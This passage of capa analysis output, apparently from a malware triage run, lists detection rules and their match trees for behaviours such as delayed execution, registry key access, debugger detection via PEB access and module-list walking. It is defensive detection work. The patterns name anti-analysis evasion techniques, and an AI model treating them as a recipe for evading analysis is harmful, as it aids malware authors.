                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "or"
                    }
                  },
                  "children": [
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "number",
                          "number": 2147483903
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "number",
                          "number": 255
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 6442465853
                        }
                      ],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ]
        ]
      },
      "delay execution": {
        "meta": {
          "name": "delay execution",
          "authors": [
            "michael.hunhoff@mandiant.com",
            "@ramen0x3f"
          ],
          "scopes": {
            "static": "basic block",
            "dynamic": "call"
          },
          "attack": [],
          "mbc": [
            {
              "parts": [
                "Anti-Behavioral Analysis",
                "Dynamic Analysis Evasion",
                "Delayed Execution"
              ],
              "objective": "Anti-Behavioral Analysis",
              "behavior": "Dynamic Analysis Evasion",
              "method": "Delayed Execution",
              "id": "B0003.003"
            }
          ],
          "references": [
            "https://docs.microsoft.com/en-us/windows/win32/sync/wait-functions",
            "https://github.com/LordNoteworthy/al-khaser/blob/master/al-khaser/TimingAttacks/timing.cpp"
          ],
          "examples": [
            "al-khaser_x86.exe_:0x449770",
            "B5F85C26D7AA5A1FB4AF5821B6B5AB9B:0x402FA6"
          ],
          "description": "",
          "lib": true,
          "is_subscope_rule": false,
          "maec": {}
        },
        "source": "rule:\r\n  meta:\r\n    name: delay execution\r\n    authors:\r\n      - michael.hunhoff@mandiant.com\r\n      - \"@ramen0x3f\"\r\n    lib: true\r\n    scopes:\r\n      static: basic block\r\n      dynamic: call\r\n    mbc:\r\n      - Anti-Behavioral Analysis::Dynamic Analysis Evasion::Delayed Execution [B0003.003]\r\n    references:\r\n      - https://docs.microsoft.com/en-us/windows/win32/sync/wait-functions\r\n      - https://github.com/LordNoteworthy/al-khaser/blob/master/al-khaser/TimingAttacks/timing.cpp\r\n    examples:\r\n      - al-khaser_x86.exe_:0x449770\r\n      - B5F85C26D7AA5A1FB4AF5821B6B5AB9B:0x402FA6\r\n  features:\r\n    - or:\r\n      - and:\r\n        - os: windows\r\n        - or:\r\n          - api: kernel32.Sleep\r\n          - api: kernel32.SleepEx\r\n          - api: kernel32.WaitForSingleObject\r\n          - api: kernel32.SignalObjectAndWait\r\n          - api: kernel32.WaitForSingleObjectEx\r\n          - api: kernel32.WaitForMultipleObjects\r\n          - api: kernel32.WaitForMultipleObjectsEx\r\n          - api: kernel32.RegisterWaitForSingleObject\r\n          - api: WaitOnAddress\r\n          - api: user32.MsgWaitForMultipleObjects\r\n          - api: user32.MsgWaitForMultipleObjectsEx\r\n          - api: NtDelayExecution\r\n          - api: KeWaitForSingleObject\r\n          - api: KeDelayExecutionThread\r\n      - and:\r\n        - or:\r\n          - os: linux\r\n          - os: android\r\n        - or:\r\n          - api: sleep\r\n          - api: usleep\r\n",
        "matches": [
          [
            {
              "type": "absolute",
              "value": 6442455139
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": false,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "os",
                              "os": "linux"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "os",
                              "os": "android"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "sleep"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "usleep"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "os",
                          "os": "windows"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "no address"
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "Sleep"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "SleepEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitForSingleObject"
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 6442455146
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "SignalObjectAndWait"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitForSingleObjectEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitForMultipleObjects"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitForMultipleObjectsEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "RegisterWaitForSingleObject"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitOnAddress"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "MsgWaitForMultipleObjects"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "MsgWaitForMultipleObjectsEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "NtDelayExecution"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "KeWaitForSingleObject"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "KeDelayExecutionThread"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ]
        ]
      },
      "create or open registry key": {
        "meta": {
          "name": "create or open registry key",
          "authors": [
            "michael.hunhoff@mandiant.com",
            "anushka.virgaonkar@mandiant.com"
          ],
          "scopes": {
            "static": "basic block",
            "dynamic": "call"
          },
          "attack": [],
          "mbc": [
            {
              "parts": [
                "Operating System",
                "Registry",
                "Create Registry Key"
              ],
              "objective": "Operating System",
              "behavior": "Registry",
              "method": "Create Registry Key",
              "id": "C0036.004"
            },
            {
              "parts": [
                "Operating System",
                "Registry",
                "Open Registry Key"
              ],
              "objective": "Operating System",
              "behavior": "Registry",
              "method": "Open Registry Key",
              "id": "C0036.003"
            }
          ],
          "references": [],
          "examples": [
            "Practical Malware Analysis Lab 03-02.dll_:0x10004706",
            "Practical Malware Analysis Lab 11-01.exe_:0x401000",
            "493167E85E45363D09495D0841C30648:0x404D60",
            "B5F85C26D7AA5A1FB4AF5821B6B5AB9B:0x4045F2",
            "B5F85C26D7AA5A1FB4AF5821B6B5AB9B:0x40433E",
            "692f7fd6d198e804d6af98eb9e390d61:0x6000003"
          ],
          "description": "",
          "lib": true,
          "is_subscope_rule": false,
          "maec": {}
        },
        "source": "rule:\r\n  meta:\r\n    name: create or open registry key\r\n    authors:\r\n      - michael.hunhoff@mandiant.com\r\n      - anushka.virgaonkar@mandiant.com\r\n    lib: true\r\n    scopes:\r\n      static: basic block\r\n      dynamic: call\r\n    mbc:\r\n      - Operating System::Registry::Create Registry Key [C0036.004]\r\n      - Operating System::Registry::Open Registry Key [C0036.003]\r\n    examples:\r\n      - Practical Malware Analysis Lab 03-02.dll_:0x10004706\r\n      - Practical Malware Analysis Lab 11-01.exe_:0x401000\r\n      - 493167E85E45363D09495D0841C30648:0x404D60\r\n      - B5F85C26D7AA5A1FB4AF5821B6B5AB9B:0x4045F2\r\n      - B5F85C26D7AA5A1FB4AF5821B6B5AB9B:0x40433E\r\n      - 692f7fd6d198e804d6af98eb9e390d61:0x6000003\r\n  features:\r\n    - or:\r\n      - api: advapi32.RegOpenKey\r\n      - api: advapi32.RegOpenKeyEx\r\n      - api: advapi32.RegCreateKey\r\n      - api: advapi32.RegCreateKeyEx\r\n      - api: advapi32.RegOpenCurrentUser\r\n      - api: advapi32.RegOpenKeyTransacted\r\n      - api: advapi32.RegOpenUserClassesRoot\r\n      - api: advapi32.RegCreateKeyTransacted\r\n      - api: ZwOpenKey\r\n      - api: ZwOpenKeyEx\r\n      - api: ZwCreateKey\r\n      - api: ZwOpenKeyTransacted\r\n      - api: ZwOpenKeyTransactedEx\r\n      - api: ZwCreateKeyTransacted\r\n      - api: NtOpenKey\r\n      - api: NtCreateKey\r\n      - api: SHRegOpenUSKey\r\n      - api: SHRegCreateUSKey\r\n      - api: RtlCreateRegistryKey\r\n      - api: Microsoft.Win32.RegistryKey::OpenSubKey\r\n      - api: Microsoft.Win32.RegistryKey::OpenBaseKey\r\n      - api: Microsoft.Win32.RegistryKey::OpenRemoteBaseKey\r\n      - api: Microsoft.Win32.RegistryKey::CreateSubKey\r\n",
        "matches": [
          [
            {
              "type": "absolute",
              "value": 6442455880
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "RegOpenKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "RegOpenKeyEx"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "RegCreateKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "RegCreateKeyEx"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "RegOpenCurrentUser"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "RegOpenKeyTransacted"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "RegOpenUserClassesRoot"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442456237
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "RegCreateKeyTransacted"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ZwOpenKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ZwOpenKeyEx"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ZwCreateKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ZwOpenKeyTransacted"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ZwOpenKeyTransactedEx"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ZwCreateKeyTransacted"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "NtOpenKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "NtCreateKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "SHRegOpenUSKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "SHRegCreateUSKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "RtlCreateRegistryKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "Microsoft.Win32.RegistryKey::OpenSubKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "Microsoft.Win32.RegistryKey::OpenBaseKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "Microsoft.Win32.RegistryKey::OpenRemoteBaseKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "Microsoft.Win32.RegistryKey::CreateSubKey"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ]
        ]
      },
      "PEB access": {
        "meta": {
          "name": "PEB access",
          "authors": [
            "michael.hunhoff@mandiant.com"
          ],
          "scopes": {
            "static": "basic block"
          },
          "attack": [],
          "mbc": [
            {
              "parts": [
                "Anti-Behavioral Analysis",
                "Debugger Detection",
                "Process Environment Block"
              ],
              "objective": "Anti-Behavioral Analysis",
              "behavior": "Debugger Detection",
              "method": "Process Environment Block",
              "id": "B0001.019"
            }
          ],
          "references": [
            "https://github.com/LordNoteworthy/al-khaser/blob/master/al-khaser/AntiDebug/NtGlobalFlag.cpp"
          ],
          "examples": [
            "al-khaser_x86.exe_:0x420D20"
          ],
          "description": "",
          "lib": true,
          "is_subscope_rule": false,
          "maec": {}
        },
        "source": "rule:\r\n  meta:\r\n    name: PEB access\r\n    authors:\r\n      - michael.hunhoff@mandiant.com\r\n    lib: true\r\n    scopes:\r\n      static: basic block\r\n      dynamic: unsupported  # requires characteristic, offset, mnemonic features\r\n    mbc:\r\n      - Anti-Behavioral Analysis::Debugger Detection::Process Environment Block [B0001.019]\r\n    references:\r\n      - https://github.com/LordNoteworthy/al-khaser/blob/master/al-khaser/AntiDebug/NtGlobalFlag.cpp\r\n    examples:\r\n      - al-khaser_x86.exe_:0x420D20\r\n  features:\r\n    - or:\r\n      - characteristic: peb access\r\n      - and:\r\n        # https://github.com/LordNoteworthy/al-khaser/blob/master/al-khaser/AntiDebug/NtGlobalFlag.cpp#L41\r\n        - arch: i386\r\n        - characteristic: fs access\r\n        - or:\r\n          # in 0f5d5d07c6533bc6d991836ce79daaa1\r\n          # then we have:\r\n          #\r\n          #     xor edx, edx\r\n          #     mov edx, fs:[edx+30h]\r\n          - offset: 0x30\r\n          - instruction:\r\n            # in the case of CallObfuscator, gs:[rax]\r\n            - mnemonic: add\r\n            - number: 0x30\r\n      - and:\r\n        - arch: amd64\r\n        - characteristic: gs access\r\n        - or:\r\n          - offset: 0x60\r\n          - instruction:\r\n            - mnemonic: add\r\n            - number: 0x60\r\n      - and:\r\n        # WoW64 PEB address is fetched via the WoW64 Thread Environment Block (TEB) at FS:[0x18]-0x2000\r\n        # https://github.com/LordNoteworthy/al-khaser/blob/master/al-khaser/AntiDebug/NtGlobalFlag.cpp#L45\r\n        - characteristic: fs access\r\n        - instruction:\r\n          - mnemonic: sub\r\n          - number: 0x2000\r\n",
        "matches": [
          [
            {
              "type": "absolute",
              "value": 6442464582
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "peb access"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "characteristic",
                          "characteristic": "fs access"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "match",
                          "match": "PEB access/9d7880435c974efead46712e388ff364"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "arch",
                          "arch": "i386"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "characteristic",
                          "characteristic": "fs access"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "offset",
                              "offset": 48
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "match",
                              "match": "PEB access/bf91a73f78d8403b8c253a33b4b273a8"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "arch",
                          "arch": "amd64"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "no address"
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "characteristic",
                          "characteristic": "gs access"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 6442464596
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "offset",
                              "offset": 96
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 6442464623
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "match",
                              "match": "PEB access/c9144047927f432396a43839121c8b32"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442466123
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "characteristic",
                      "characteristic": "peb access"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "characteristic",
                          "characteristic": "fs access"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "match",
                          "match": "PEB access/9d7880435c974efead46712e388ff364"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "arch",
                          "arch": "i386"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "characteristic",
                          "characteristic": "fs access"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "offset",
                              "offset": 48
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "match",
                              "match": "PEB access/bf91a73f78d8403b8c253a33b4b273a8"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "arch",
                          "arch": "amd64"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "no address"
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "characteristic",
                          "characteristic": "gs access"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 6442466145
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "offset",
                              "offset": 96
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 6442466154
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "match",
                              "match": "PEB access/c9144047927f432396a43839121c8b32"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ]
        ]
      },
      "access PEB ldr_data": {
        "meta": {
          "name": "access PEB ldr_data",
          "namespace": "linking/runtime-linking",
          "authors": [
            "moritz.raabe@mandiant.com"
          ],
          "scopes": {
            "static": "basic block"
          },
          "attack": [
            {
              "parts": [
                "Execution",
                "Shared Modules"
              ],
              "tactic": "Execution",
              "technique": "Shared Modules",
              "subtechnique": "",
              "id": "T1129"
            }
          ],
          "mbc": [],
          "references": [
            "https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/api/ntpsapi_x/peb_ldr_data.htm",
            "https://github.com/d35ha/CallObfuscator/blob/5834aff9ff4511f1408ae4ce80b79737af4ae77b/ShellCode/shell_x64.asm#L8"
          ],
          "examples": [
            "3FDFB2D522E7DEECAAAF2F87420F7E75:0x4117B7"
          ],
          "description": "",
          "lib": false,
          "is_subscope_rule": false,
          "maec": {}
        },
        "source": "rule:\r\n  meta:\r\n    name: access PEB ldr_data\r\n    namespace: linking/runtime-linking\r\n    authors:\r\n      - moritz.raabe@mandiant.com\r\n    scopes:\r\n      static: basic block\r\n      dynamic: unsupported  # requires offset features\r\n    att&ck:\r\n      - Execution::Shared Modules [T1129]\r\n    references:\r\n      - https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/api/ntpsapi_x/peb_ldr_data.htm\r\n      - https://github.com/d35ha/CallObfuscator/blob/5834aff9ff4511f1408ae4ce80b79737af4ae77b/ShellCode/shell_x64.asm#L8\r\n    examples:\r\n      - 3FDFB2D522E7DEECAAAF2F87420F7E75:0x4117B7\r\n  features:\r\n    - or:\r\n      - and:\r\n        - arch: i386\r\n        - description: x32\r\n\r\n        - match: PEB access\r\n\r\n        # x86 Windows uses fs:0 to access the TIB which contains SEH information at offset 0\r\n        # checking for fs:0 and a (possibly unrelated) number or offset often results in false positives\r\n\r\n        - offset: 0x0C = PEB.LDR_DATA\r\n\r\n        - or:\r\n          - description: resolve a module list\r\n          - offset: 0x0C = PEB.LDR_DATA.InLoadOrderModuleList\r\n          - offset: 0x14 = PEB.LDR_DATA.InMemoryOrderModuleList\r\n          - offset: 0x1C = PEB.LDR_DATA.InInitializationOrderModuleList\r\n\r\n      - and:\r\n        - arch: amd64\r\n        - description: x64\r\n\r\n        - match: PEB access\r\n\r\n        - offset: 0x18 = PEB.LDR_DATA\r\n\r\n        - or:\r\n          - description: resolve a module list\r\n          - offset: 0x10 = PEB.LDR_DATA.InLoadOrderModuleList\r\n          - offset: 0x20 = PEB.LDR_DATA.InMemoryOrderModuleList\r\n          - offset: 0x30 = PEB.LDR_DATA.InInitializationOrderModuleList\r\n",
        "matches": [
          [
            {
              "type": "absolute",
              "value": 6442466123
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and",
                      "description": "x32"
                    }
                  },
                  "children": [
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "arch",
                          "arch": "i386"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "match",
                          "match": "PEB access"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "or"
                            }
                          },
                          "children": [
                            {
                              "success": false,
                              "node": {
                                "type": "feature",
                                "feature": {
                                  "type": "characteristic",
                                  "characteristic": "peb access"
                                }
                              },
                              "children": [],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "statement",
                                "statement": {
                                  "type": "and"
                                }
                              },
                              "children": [
                                {
                                  "success": false,
                                  "node": {
                                    "type": "feature",
                                    "feature": {
                                      "type": "characteristic",
                                      "characteristic": "fs access"
                                    }
                                  },
                                  "children": [],
                                  "locations": [],
                                  "captures": {}
                                },
                                {
                                  "success": false,
                                  "node": {
                                    "type": "feature",
                                    "feature": {
                                      "type": "match",
                                      "match": "PEB access/9d7880435c974efead46712e388ff364"
                                    }
                                  },
                                  "children": [],
                                  "locations": [],
                                  "captures": {}
                                }
                              ],
                              "locations": [],
                              "captures": {}
                            },
                            {
                              "success": false,
                              "node": {
                                "type": "statement",
